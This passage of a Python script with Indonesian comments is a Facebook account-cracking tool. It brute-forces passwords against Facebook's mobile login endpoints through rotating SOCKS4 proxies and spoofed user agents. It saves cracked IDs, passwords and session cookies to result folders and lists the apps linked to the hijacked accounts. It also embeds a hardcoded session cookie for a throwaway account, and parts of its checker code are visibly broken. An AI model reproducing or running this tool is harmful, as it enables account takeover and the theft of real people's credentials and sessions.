			po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[bold yellow]{cpc}")
				tree.add(f"[bold yellow]{tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]{tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{n}[{Hm}{nok}{n}] {B}{muncul[0]} {muncul[1]}{n}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{n}[{KM}{hit}{n}] {M}{muncul[0]} {muncul[1]}{n}\n")
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]{tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[bold green]{infoakun}\n") 
					cetak(tree) 
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#===============[ ASYNC ]=================#
def crack_mtouch_sync(idf,pwv):
	global loop,ok,cp
	bo = random.choice([HM,KM,BM])
	prog.update(des,description=f"[%] mtouch_async die:-{loop} ok:-[bold green]{ok}[/] cp:-[bold yellow]{cp}[/] total:-{len(id)}")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	for pw in pwv:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs= {'http': 'socks4://'+nip}
			ua = Saran(glento=1)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[bold yellow]{cpc}")
				tree.add(f"[bold yellow]{tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]{tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{n}[{Hm}{nok}{n}] {B}{muncul[0]} {muncul[1]}{n}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{n}[{KM}{hit}{n}] {M}{muncul[0]} {muncul[1]}{n}\n")
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]{tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[bold green]{infoakun}") 
					cetak(tree) 
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#=============[ LOGIN HASIL CP ]===============#
import requests, os, re
#=================[ WARNA ]===================#
M = '\x1b[1;91m' #===> MERAH
N = '\x1b[0m'       #===> DEFAULT
H = '\x1b[1;92m'  #===> HIJAU
K = '\x1b[1;93m'  #===> KUNING

class cp_detector:

    def __init__(self):
        self.ses=requests.Session()###GANTI COOKIE BUAT CEK OPSI CP DISINI YAK BANG(:###
        self.cok = {"cookie": "datr=xlIwZIU1kxVpfiYebGvpysbb; sb=xlIwZDxdEnWhcdg1S3Qr12kc; vpd=v1%3B630x360x2; locale=id_ID; c_user=100022975116681; xs=34%3AGcKoJ6sScqGG_A%3A2%3A1683316610%3A-1%3A13163; m_page_voice=100022975116681; fbl_cs=AhCPMGJYkU8LjphIFIJ8F4QsGFV2NlhJNm5sRUlkSStmZXZlV0UyWFA9dA; fbl_ci=1084000855891386; fr=08XpXQ9aXaS7MpqvF.AWV_decrzKj5dQovRwFtt31__pE.BkMFLG.nk.AAA.0.0.BkVW8N.AWViGv79iD4; dpr=2; wd=360x630; wl_cbv=v2%3Bclient_version%3A2244%3Btimestamp%3A1683637689; fbl_st=100433038%3BT%3A28062228"}
        self.cek()

    def cek(self):
        cetak(panel("""[bold white]warning untuk mengecek opsi login cp pastikan hasil result cp tersimpan di folder CP/namafile untuk cek opsi login ini hasil ok/cek login mbasic free tidak 100% login kecuali akun baru crack cp selain itu bisa jadi password salah/a2f!!!""", width=70,style=f"bold white"))
        cp = []
        try:
            xxx = os.listdir("CP")
            for z in xxx:
                cp.append(z)
        except:pass
        if len(cp)==0:
            exit("Anda Tidak Memiliki Result Silakan Crack Dan Masukan Hasil Cp Ke Dalam CP")
        else:
            xa, xx = {}, 0
            for x in cp:
                try:xz = open(f"CP/{n}").readlines()
                except:continue
                xx+=1
                if xx<100:
                    nom = ""+str(xx)
                    xa.update({str(xx):str(x)})
                    xa.update({nom+"0":str(xx)})
                    print(f'[{nom}] {x} total result cp kamu : {K}{str(len(xz))}{N}')
                else:
                    xa.update({str(xx):str(x)})
                    print(f'[{nom}] {x} total result cp kamu : {K}{str(len(xz))}{N}')
        file = input(f"[%] input nomer file cp : ")
        try:ajg = xa[file]
        except KeyError:
            print("masukan pilihan yang bener")
        try:
            fi = open(f"CP/{ajg}").readlines()
        except FileNotFoundError:
            print("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
        for yxz in fi:
            user = yxz.replace("\n", "")
            usez = user.split("|")
            self.log_hasil(usez[0], usez[1])

    def log_hasil(self, user, pasw):
        global live,chek
        print('') 
        sys.stdout.write(f"\r[{H}OK:{live}{P}]—[{K}CP:{chek}{P}]")
        try:
            link = self.ses.get(f"https://mbasic.facebook.com/{user}/friends", cookies=self.cok).text
            cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
            if "mbasic_logout_button" not in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda terkena checkpoint")
            elif "Anda Diblokir Sementar" in str(link):
                exit(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
            elif "/zero/optin/write" in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda menggunakan free Facebook, silahkan ubah ke mode data.")
            elif "0" in str(len(cari)):
                print(f"\r{K}[CP] {user}|{pasw}{N}")
                open("result/CP.txt", "a").write(f"{user}|{pasw}\n")
                cpe+=1
            else:
                print(f"\r{H}[cek mbasic/free] {user}|{pasw}|{cari[0]}{N}")
                oke+=1
                open("CP/log.txt", "a").write(f"{user}|{pasw}\n")
        except Exception as e:exit(e)
#============[ BAGIAN CEK HASIL ]==============#
def cek_ressult_akun():
	cetak(panel(f"[bold green]01[bold white].cek hasil ok\n[bold green]02[bold white].cek hasil cp\n[bold green]03[bold white].kembali ke menu", width=70, padding=(0,25), style=f"bold white")) 
	xr = input(f'[*] input 1/3 : ')
#==============[  CEK HASIL OK ]================#
	if xr in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('kamu tidak mempunyai result live')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('')
					print(f'     %s.%s {HM}%s{n} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'     %s.%s {HM}%s{n} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n[%] input result : ')
			try:geh = lol[geeh]
			except KeyError:
				print('pilih yang benar')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('file tidak di temukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{n}     {HM}*---> {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{n}')
				nocp +=1
			print('')
			input(f'klik enter untuk kembali ke menu utama ')
			menu_xr()
#==============[  CEK HASIL CP ]================#
	elif xr in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'     %s.%s {KM}%s{n} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'     %s.%s {KM}%s{n} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih result : ')
			try:geh = lol[geeh]
			except KeyError:
				print('pilih yang benar  ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('file tidak di temukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{n}     {KM}*---> {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{n}klick enter untuk kembali ke menu')
			menu_xr()
	elif xr in ['3','03']:
		back()
	else:
		print('Pilih Yang Bener ')
		exit() 
#=============[ CEK APLIKASI ]===============#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {n}[{KM}!{n}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {n}[{KM}!{n}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
			
#===============[ START ]=================#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	login()